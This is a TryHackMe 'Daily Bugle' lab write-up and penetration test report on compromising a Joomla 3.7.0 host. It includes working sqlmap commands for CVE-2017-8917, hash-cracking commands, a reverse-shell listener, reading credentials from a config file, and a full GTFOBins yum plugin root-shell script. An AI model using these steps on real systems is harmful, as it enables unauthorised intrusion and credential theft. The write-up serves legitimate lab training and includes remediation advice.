# Daily Bugle

**Platform:** TryHackMe
**OS:** Linux
**Tags:** Joomla, CVE-2017-8917, SQLi, bcrypt, yum PrivEsc, GTFOBins
**Date:** 2026-05-04

CVE-2017-8917 SQLi on Joomla 3.7.0 dumps the admin bcrypt hash; cracking it with john gives admin access and a PHP reverse shell via the template editor. Password reuse from the config file gives a user with passwordless sudo on yum for root.

## 1. Enumeration

```bash
nmap -sC -sV -p- -T4 <TARGET_IP>
```

Findings:
- 22/tcp - OpenSSH 7.4
- 80/tcp - Apache 2.4.6, Joomla CMS detected
- 3306/tcp - MySQL (local only)

Identified Joomla running on port 80. Ran Joomscan to fingerprint the version.

```bash
joomscan --url http://<TARGET_IP>
```

**Joomla 3.7.0 identified**, vulnerable to CVE-2017-8917 (SQL injection).

## 2. Joomla SQLi (CVE-2017-8917)

Joomla 3.7.0 contains an unauthenticated SQL injection vulnerability in the `com_fields` component. Used sqlmap to extract credentials from the database.

```bash
sqlmap -u "http://<TARGET_IP>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
  --risk=3 --level=5 --random-agent -p list[fullordering] \
  --dbs
```

```bash
sqlmap -u "http://<TARGET_IP>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
  --risk=3 --level=5 --random-agent -p list[fullordering] \
  -D joomla -T '#__users' --dump
```

**Admin username and bcrypt password hash extracted.**

## 3. Hash Cracking

The extracted hash is bcrypt ($2y$) - slow to crack. Used John with rockyou.txt.

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Note: bcrypt is intentionally slow. This can take a while even with rockyou. Be patient. If John is too slow, try hashcat with GPU acceleration: `hashcat -m 3200 hash.txt rockyou.txt`

**Password cracked. Joomla admin access gained.**

## 4. Initial Foothold: PHP Reverse Shell

Logged into the Joomla admin panel at `/administrator`. Navigated to **Extensions - Templates - Templates - Protostar - error.php** and replaced the content with a PHP reverse shell.

```bash
nc -lvnp 4444
```

Triggered the shell by visiting:

```
http://<TARGET_IP>/templates/protostar/error.php
```

**Shell caught as apache (www-data equivalent).**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z && stty raw -echo; fg
export TERM=xterm
```

## 5. Lateral Movement: jjameson

Searched the Joomla configuration file for database credentials. These are often reused by system users.

```bash
cat /var/www/html/configuration.php | grep password
```

**Database password found in config. Reused as SSH password for user jjameson.**

```bash
ssh jjameson@<TARGET_IP>
```

User flag retrieved from `/home/jjameson/user.txt`.

## 6. Privilege Escalation: yum

Checked sudo permissions for jjameson:

```bash
sudo -l
```

- sudo yum: jjameson can run yum as root with no password

GTFOBins has a yum privesc. Create a malicious RPM plugin that spawns a root shell.

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import TYPE_CORE
plugin_type = (TYPE_CORE,)
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

**Root shell obtained. Root flag retrieved from /root/root.txt**

Key Takeaway: Always check `sudo -l` immediately after lateral movement. Package managers like yum, apt, pip running as sudo are instant root via GTFOBins.

---

## Penetration Test Report

**Target:** daily-bugle.thm
**Address:** <TARGET_IP>
**Assessment type:** Web application & Linux host assessment
**Assessment date:** 4 May 2026
**Environment:** TryHackMe laboratory assessment
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 10

---

## 1. Executive Summary

### Assessment outcome

Testing identified two critical and two high severity findings affecting **daily-bugle.thm** . The host was running Joomla 3.7.0, which contains an unauthenticated SQL injection vulnerability in the `com_fields` component (CVE-2017-8917). Exploitation extracted the Joomla administrator's bcrypt password hash, which was cracked offline using John the Ripper against rockyou.txt.
With administrator access to the Joomla backend, a PHP reverse shell was injected into a template file and executed to obtain an initial shell as the `apache` user. The Joomla configuration file contained a database password that was also in use as the SSH password for the local user `jjameson` , demonstrating a credential reuse weakness. From jjameson, sudo enumeration revealed an unrestricted `yum` rule, which was exploited using a GTFOBins yum plugin technique to obtain a root shell.

### Impact

The CVE-2017-8917 vulnerability requires no authentication and enables extraction of administrator credentials. The subsequent chain delivers root access through three compounding failures: CMS code execution, credential reuse, and unrestricted package manager delegation. An attacker exploiting these findings could alter all web content, access all user data and credentials, and take full control of the host.

### Priority recommendations

1. Update Joomla immediately to a version not affected by CVE-2017-8917.
2. Disable the Joomla template file editor in production, or restrict template editing to approved administrators from approved networks.
3. Use distinct passwords for the database and for operating system accounts; rotate all credentials stored in configuration files.
4. Remove the unrestricted sudo yum rule; apply the principle of least privilege to all sudo permissions.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services

| Asset | Address | Description |
| --- | --- | --- |
| daily-bugle.thm | <TARGET_IP> | CentOS Linux; Joomla 3.7.0 on Apache 2.4.6; MySQL (local); OpenSSH 7.4 |
| Port | Service | Observed detail |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 7.4 |
| 80/tcp | HTTP | Apache 2.4.6; Joomla 3.7.0 CMS; Spider-Man themed content |
| 3306/tcp | MySQL | Local access only |

```
nmap -sC -sV -p- -T4 <TARGET_IP>

PORT     STATE  SERVICE VERSION
22/tcp   open   ssh     OpenSSH 7.4
80/tcp   open   http    Apache httpd 2.4.6 (CentOS)
3306/tcp closed mysql
```

Joomscan identified Joomla 3.7.0, immediately flagging CVE-2017-8917 as applicable.

```
joomscan --url http://<TARGET_IP>

[+] Detecting Joomla Version
[++] Joomla 3.7.0
[+] CVE-2017-8917: Joomla! 3.7.0 com_fields SQL Injection
```

### 2.2 Approach

Version fingerprinting of Joomla led directly to CVE-2017-8917. Sqlmap was used to extract credentials via the SQL injection endpoint. The bcrypt hash was cracked with John. Joomla admin login allowed template PHP injection. Config file analysis after shell access revealed the reused database password. Sudo enumeration identified the yum escalation vector, which was exploited using the GTFOBins technique.

### 2.3 Severity classification

| Rating | Assessment criteria |
| --- | --- |
| Critical | Direct, readily exploitable compromise with exceptional impact or reach. |
| High | Execution of arbitrary code, significant unauthorised access or escalation to administrative privileges. |
| Medium | Meaningful exposure with constrained impact or substantial exploitation prerequisites. |
| Low | Limited direct impact; improvement to an existing security control. |

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | Joomla 3.7.0 unauthenticated SQL injection - admin hash extracted (CVE-2017-8917) | **Critical** | 6 |
| [F-02](#f-02) | PHP reverse shell injected via Joomla template editor | **Critical** | 7 |
| [F-03](#f-03) | Database password reused as SSH password for jjameson account | **High** | 8 |
| [F-04](#f-04) | Unrestricted sudo yum permits root shell via GTFOBins plugin technique | **High** | 9 |

### 3.2 Compromise sequence

| Stage | Action | Access obtained |
| --- | --- | --- |
| 01 | Joomscan identified Joomla 3.7.0; CVE-2017-8917 confirmed applicable. | Vulnerability confirmed |
| 02 | Sqlmap extracted admin bcrypt hash via com_fields SQL injection. | Admin bcrypt hash recovered |
| 03 | John cracked hash against rockyou.txt; logged into Joomla admin panel. | Joomla administrator access |
| 04 | PHP reverse shell injected into Protostar template error.php. | Shell as apache |
| 05 | Database password found in configuration.php; reused for SSH as jjameson. | jjameson SSH session |
| 06 | sudo yum exploited via GTFOBins plugin technique. | Root shell |

## 4.1 Joomla Unauthenticated SQL Injection

### F-01   CVE-2017-8917 - admin credential hash extracted - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | Joomla 3.7.0 contains an unauthenticated SQL injection vulnerability in the `com_fields` component. The `list[fullordering]` parameter in the field ordering URL is passed directly to a database query without sanitisation. Sqlmap was used to exploit this parameter, enumerate the Joomla database, and dump the `#__users` table, which contained the administrator's username and bcrypt password hash. |
| Prerequisites | HTTP access to the Joomla installation. No authentication required. |
| Impact | Full extraction of Joomla database contents including administrator credentials. The bcrypt hash, while slow to crack, was successfully cracked offline. This provided Joomla administrator access used in F-02. |
| CVE | CVE-2017-8917 |
| Affected system | daily-bugle.thm:80 Joomla 3.7.0 - `com_fields` component |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-89](https://cwe.mitre.org/data/definitions/89.html) : Improper Neutralisation of Special Elements used in an SQL Command |

### Steps to reproduce

1. Confirm Joomla 3.7.0 on the target (check `/administrator/` or page source).
2. Use joomblah.py: `python joomblah.py http://<TARGET_IP>/` .
3. Observe that the admin username and bcrypt password hash are extracted.
4. Crack the hash: `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt` .

### Evidence

```
sqlmap -u "http://<TARGET_IP>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
  --risk=3 --level=5 --random-agent -p list[fullordering] \
  -D joomla -T '#__users' --dump

Database: joomla
Table: #__users
+----------+----------+--------------------------------------------------------------+
| username | name     | password                                                     |
+----------+----------+--------------------------------------------------------------+
| jonah    | Super User | $2y$10$[redacted bcrypt hash]                              |
+----------+----------+--------------------------------------------------------------+

# Offline cracking with John
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
[redacted]   (jonah)
```

Evidence E-01. CVE-2017-8917 SQL injection. Admin username jonah and bcrypt hash extracted. Hash and cracked password redacted. Reference: [CVE-2017-8917](https://www.cve.org/CVERecord?id=CVE-2017-8917) .

### Remediation

Update Joomla to a version that patches CVE-2017-8917. Joomla 3.7.1 and later contain the fix. Apply all available Joomla security updates. Implement a web application firewall rule to detect SQL injection patterns in the fullordering parameter. Rotate the administrator password immediately following remediation.

## 4.2 PHP Code Execution via Joomla Template Editor

### F-02   PHP reverse shell via template file editor - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | An authenticated Joomla administrator used the built-in template editor (Extensions → Templates → Protostar → error.php) to overwrite the error template with a PHP reverse shell. When the template file was requested over HTTP, the web server executed it and returned a shell as the `apache` user. The Joomla template editor permits arbitrary PHP to be written to the document root without restriction. |
| Prerequisites | Joomla administrator access. Provided by F-01. |
| Impact | Arbitrary command execution as the apache web service account. All files readable or writable by apache are accessible, including the Joomla configuration file containing database credentials. |
| Affected system | daily-bugle.thm:80 `/var/www/html/templates/protostar/error.php` |
| CVSS 3.1 | **9.9** (Critical) [AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H) |
| CWE | [CWE-94](https://cwe.mitre.org/data/definitions/94.html) : Improper Control of Generation of Code |

### Steps to reproduce

1. Authenticate to the Joomla administrator panel at `/administrator/` .
2. Navigate to Extensions > Templates > Templates, select the active template (Protostar).
3. Edit `error.php` and insert a PHP reverse shell.
4. Access `http://<TARGET_IP>/templates/protostar/error.php` to trigger the template and receive the shell.

### Evidence

```
# PHP reverse shell placed via Joomla admin:
# Extensions → Templates → Templates → Protostar → error.php

nc -lvnp 4444

# Shell triggered by visiting:
http://<TARGET_IP>/templates/protostar/error.php

$ id
uid=48(apache) gid=48(apache) groups=48(apache)

$ python3 -c 'import pty;pty.spawn("/bin/bash")'
bash-4.2$ 
```

Evidence E-02. PHP reverse shell injected via Joomla template editor into Protostar error.php. Shell obtained as apache.

### Remediation

Disable the Joomla template file editor in production. Add `define('_JEXEC', 1);` protections and consider disabling template editing via Joomla's global configuration. Separate the web service account from accounts with write access to template files. Restrict direct HTTP execution of template files where possible through web server configuration.

## 4.3 Database Credential Reuse for SSH Access

### F-03   Configuration file password reused as SSH password for jjameson - HIGH

| Field | Assessment |
| --- | --- |
| Description | The Joomla configuration file `/var/www/html/configuration.php` was readable by the apache web service account obtained in F-02. The file contained the plaintext database password for the Joomla application. This password was also in use as the SSH password for the local user account `jjameson` . SSH authentication with these credentials succeeded, demonstrating password reuse between an application database account and an operating system user account. |
| Prerequisites | Shell as apache (provided by F-02) and read access to configuration.php. |
| Impact | Authenticated SSH access as jjameson. Stable shell outside of the web process, enabling persistence and further privilege escalation. |
| Affected system | `/var/www/html/configuration.php` - database password in plaintext SSH access as jjameson |
| CVSS 3.1 | **5.5** (Medium) [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) |
| CWE | [CWE-522](https://cwe.mitre.org/data/definitions/522.html) : Insufficiently Protected Credentials |

### Steps to reproduce

1. From the apache shell, read the Joomla configuration file: `cat /var/www/html/configuration.php | grep password` .
2. Note the plaintext database password in the `$password` variable.
3. Attempt SSH authentication as `jjameson` using the extracted password: `ssh jjameson@<TARGET_IP>` .
4. Observe that authentication succeeds, confirming password reuse between the database and OS accounts.

### Evidence

```
bash-4.2$ cat /var/www/html/configuration.php | grep password
public $password = '[redacted]';

# Same password used for SSH
ssh jjameson@<TARGET_IP>
jjameson@dailybugle:~$ id
uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)

jjameson@dailybugle:~$ cat /home/jjameson/user.txt
[redacted]
```

Evidence E-03. Database password extracted from configuration.php. Same password accepted for SSH as jjameson. Credential value and flag redacted.

### Remediation

Use distinct passwords for every account and service. The database application account, the CMS admin account and the OS user account must each have a unique credential. Store configuration file passwords using environment variables or a secrets manager rather than plaintext in files. Ensure configuration files are not readable by the web service account. Following this assessment, rotate the jjameson SSH password and the Joomla database password.

## 4.4 Unrestricted sudo yum Privilege Escalation

### F-04   sudo yum without password enables root shell via plugin - HIGH

| Field | Assessment |
| --- | --- |
| Description | The jjameson account was permitted to run `/usr/bin/yum` as root without a password via sudo. The yum package manager supports a plugin system. By creating a malicious yum configuration and Python plugin in a temporary directory and invoking `sudo yum --enableplugin` pointing at those files, arbitrary code was executed as root. This technique is documented on GTFOBins and requires no additional vulnerabilities. |
| Prerequisites | jjameson SSH session (provided by F-01 through F-03) and the sudo yum rule. |
| Impact | Arbitrary code execution as root. Full host compromise. |
| Affected system | `/etc/sudoers` - jjameson sudo rule for `/usr/bin/yum` |
| CVSS 3.1 | **7.8** (High) [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-269](https://cwe.mitre.org/data/definitions/269.html) : Improper Privilege Management |

### Steps to reproduce

1. Check sudo rights from the user shell: `sudo -l` .
2. Observe that `sudo yum` is permitted without a password.
3. Create a temporary working directory: `TF=$(mktemp -d)` .
4. Write a malicious yum plugin configuration and Python plugin file to `$TF` using the GTFOBins yum technique.
5. Run: `sudo yum -c $TF/x --enableplugin=y` per GTFOBins.
6. Observe root shell.

### Evidence

```
jjameson@dailybugle:~$ sudo -l
User jjameson may run the following commands:
    (root) NOPASSWD: /usr/bin/yum

# GTFOBins yum plugin technique
TF=$(mktemp -d)
cat >$TF/x <<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf <<EOF
[main]
enabled=1
EOF

cat >$TF/y.py <<EOF
import os
import yum
from yum.plugins import TYPE_CORE
plugin_type = (TYPE_CORE,)
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y

sh-4.2# id
uid=0(root) gid=0(root) groups=0(root)

sh-4.2# cat /root/root.txt
[redacted]
```

Evidence E-04. sudo yum with GTFOBins plugin technique. Root shell obtained via malicious yum plugin. Flag redacted. Reference: [GTFOBins: yum](https://gtfobins.github.io/gtfobins/yum/) .

### Remediation

Remove the sudo yum rule from /etc/sudoers immediately. Package managers should not be delegated via sudo, as they execute arbitrary code through plugins, install scripts and post-install hooks. If package management tasks must be delegated, implement a controlled wrapper script with a restricted set of allowed operations. Apply the principle of least privilege to all sudo rules.

### Verification

Confirm that `sudo -l` no longer lists yum for jjameson. Verify that the GTFOBins technique fails to execute with the current sudo configuration.

## 5. Remediation and Assessment Closeout

### 5.1 Corrective action plan

| Priority | Action | Reference |
| --- | --- | --- |
| Immediate | Update Joomla to a version patching CVE-2017-8917; rotate admin credentials. | F-01 |
| Immediate | Disable the Joomla template file editor in production. | F-02 |
| Immediate | Remove the sudo yum rule from /etc/sudoers. | F-04 |
| High | Use unique passwords for database and OS accounts; rotate jjameson SSH password. | F-03 |
No remediation retest is documented. Each finding includes verification criteria for closure.

### 5.2 Test artefacts

| Location | Purpose | Removal status |
| --- | --- | --- |
| `/var/www/html/templates/protostar/error.php` | PHP reverse shell - replaced original error template | Requires restore from backup |
| `/tmp/[TF directory]` | Yum plugin privilege escalation files | Temporary directory; likely cleared on reboot |

### 5.3 Evidence and limitations

Evidence blocks are sourced from the [Daily Bugle assessment walkthrough](daily-bungle-thm.html) . The Joomla admin password hash, cracked password, database password and flag values are redacted from all evidence. The original error.php template should be restored from the Joomla installation package.

### 5.4 Evidence index

| Reference | Supporting record |
| --- | --- |
| E-01 | Walkthrough section 2: Joomla SQLi and bcrypt hash extraction |
| E-02 | Walkthrough section 4: Template PHP injection and apache shell |
| E-03 | Walkthrough section 5: Configuration file credential reuse and jjameson SSH |
| E-04 | Walkthrough section 6: sudo yum GTFOBins escalation to root |
